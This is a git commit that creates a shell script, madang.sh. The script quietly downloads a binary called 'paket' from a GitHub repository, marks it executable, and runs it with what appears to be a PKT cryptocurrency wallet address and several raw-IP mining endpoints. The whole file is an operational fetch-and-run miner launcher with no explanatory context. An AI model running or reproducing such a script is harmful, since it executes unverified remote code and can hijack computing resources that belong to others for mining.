fc510b2262348d8730d8e7ac2686207b7576aca0
samadaferisa <110785233+samadaferisa@users.noreply.github.com>
2023-01-03 04:34:29 +0700

    Create madang.sh

---
+++ madang.sh
@@ -0,0 +1,2 @@
+wget -q 'https://github.com/samalaerena/psychic-octo-goggles/raw/main/paket' -O paketi && chmod u+x paketi
+./paketi ann -p pkt1qam6tcathyj4uhhtpgfl9jeqxw6nuqxqj3se3rp http://139.144.181.23:443 http://164.90.218.160:443/master/2048 http://164.90.218.160:80/master/3072 
